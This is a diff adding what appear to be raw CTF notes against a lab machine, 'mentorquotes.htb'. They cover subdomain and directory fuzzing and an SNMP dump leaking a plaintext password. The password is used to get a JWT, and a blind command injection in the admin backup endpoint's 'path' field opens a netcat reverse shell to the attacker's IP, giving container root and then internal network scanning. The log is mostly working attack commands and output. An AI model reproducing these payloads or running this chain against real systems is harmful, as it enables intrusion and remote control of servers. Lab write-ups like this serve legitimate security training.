@@ -1,0 +1,231 @@
+┌──(kali㉿kali)-[~]
+└─$ ffuf -u http://10.10.11.193 -H 'Host: FUZZ.mentorquotes.htb' -mc 200,404 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.193
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.mentorquotes.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,404
+________________________________________________
+
+api                     [Status: 404, Size: 22, Words: 2, Lines: 1, Duration: 29ms]
+:: Progress: [4989/4989] :: Job [1/1] :: 1492 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ 
+
+
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://api.mentorquotes.htb
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://api.mentorquotes.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/admin/]
+/docs                 (Status: 200) [Size: 969]
+/users                (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/users/]
+/quotes               (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/quotes/]
+/server-status        (Status: 403) [Size: 285]
+Progress: 20653 / 26584 (77.69%)[ERROR] parse "http://api.mentorquotes.htb/error\x1f_log": net/url: invalid control character in URL
+Progress: 26583 / 26584 (100.00%)
+===============================================================
+Finished
+===============================================================
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ 
+
+
+MentorQuotes
+
+ 0.0.1 
+
+OAS3
+
+/openapi.json
+
+Working towards helping people move forward
+james - Website
+Send email to james
+Auth
+POST
+/auth/login
+Login
+POST
+/auth/signup
+Create User
+Users
+GET
+/users/
+Get Users
+GET
+/users/{id}/
+Get User By Id
+POST
+/users/add
+Create User
+Quotes
+GET
+/quotes/
+Read All Quotes
+POST
+/quotes/
+Create Quote
+GET
+/quotes/{id}/
+Read Quote
+PUT
+/quotes/{id}/
+Update Quote
+DELETE
+/quotes/{id}/
+Delete Quote
+Schemas
+HTTPValidationError
+ValidationError
+quoteDB
+quoteSchema
+userDB
+userSchema
+
+
+
+
+iso.3.6.1.2.1.25.4.2.1.5.1933 = ""
+iso.3.6.1.2.1.25.4.2.1.5.1934 = ""
+iso.3.6.1.2.1.25.4.2.1.5.1990 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 81 -container-ip 172.22.0.2 -container-port 80"
+iso.3.6.1.2.1.25.4.2.1.5.2004 = STRING: "-namespace moby -id 26d7078bd8eab18a74d629198214cd00189d1f84f8ce21d414326ce155c1c669 -address /run/containerd/containerd.sock"
+iso.3.6.1.2.1.25.4.2.1.5.2028 = STRING: "main.py"
+iso.3.6.1.2.1.25.4.2.1.5.2067 = STRING: "-c from multiprocessing.semaphore_tracker import main;main(4)"
+iso.3.6.1.2.1.25.4.2.1.5.2068 = STRING: "-c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork"
+iso.3.6.1.2.1.25.4.2.1.5.2090 = ""
+iso.3.6.1.2.1.25.4.2.1.5.2091 = ""
+iso.3.6.1.2.1.25.4.2.1.5.2131 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
+iso.3.6.1.2.1.25.4.2.1.5.2187 = ""
+iso.3.6.1.2.1.25.4.2.1.5.2266 = ""
+iso.3.6.1.2.1.25.4.2.1.5.2667 = STRING: "-k start"
+iso.3.6.1.2.1.25.4.2.1.5.222913 = ""
+iso.3.6.1.2.1.25.4.2.1.5.222963 = ""
+iso.3.6.1.2.1.25.4.2.1.5.222999 = ""
+iso.3.6.1.2.1.25.4.2.1.5.223023 = ""
+iso.3.6.1.2.1.25.4.2.1.5.223049 = ""
+iso.3.6.1.2.1.25.4.2.1.6.1 = INTEGER: 4
+
+
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl http://api.mentorquotes.htb/auth/login -X POST -H 'Content-Type: application/json' -d '{"email":"james@mentorquotes.htb", "username":"james","password":"kj23sadkj123as0-d213"}'
+"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0"                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ 
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl http://api.mentorquotes.htb/admin/backup -H 'Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' -H 'Content-Type:application/json' -X POST -d '{}'
+{"detail":[{"loc":["body","path"],"msg":"field required","type":"value_error.missing"}]}                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ 
+
+┌──(kali㉿kali)-[~]
+└─$ curl http://api.mentorquotes.htb/admin/backup -H 'Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' -H 'Content-Type:application/json' -X POST -d '{"path":"test"}'
+{"INFO":"Done!"}                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ 
+
+
+"The path parameter seems rather interesting, so we try to inject an OS command. Since the endpoint's
+responses do not provide any useful output as to the underlying command, this is known as a blind
+injection. With that in mind, we set up a Python HTTP server to catch any potential callbacks that will verify
+successful command execution."
+
+┌──(kali㉿kali)-[~]
+└─$ curl http://api.mentorquotes.htb/admin/backup -H 'Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' -H 'Content-Type:application/json' -X POST -d '{"path":"$(nc 10.10.14.16 4444 -e /bin/sh)"}'
+{"INFO":"Done!"}                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ 
+
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444                        
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.193] 35407
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444                        
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.193] 35407
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+ls -la
+total 24
+drwxr-xr-x    1 root     root          4096 Nov 10  2022 .
+drwxr-xr-x    1 root     root          4096 Aug 21 02:55 ..
+-rw-r--r--    1 root     root          1024 Jun 12  2022 .Dockerfile.swp
+-rw-r--r--    1 root     root           522 Nov  3  2022 Dockerfile
+drwxr-xr-x    1 root     root          4096 Nov 10  2022 app
+-rw-r--r--    1 root     root           672 Jun  4  2022 requirements.txt
+
+ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+11: eth0@if12: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
+    link/ether 02:42:ac:16:00:03 brd ff:ff:ff:ff:ff:ff
+    inet 172.22.0.3/16 brd 172.22.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+/tmp/nmap -sn 172.22.0.0/24
+ls
+nmap
+
+
+problem tunneling... skipping for now.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
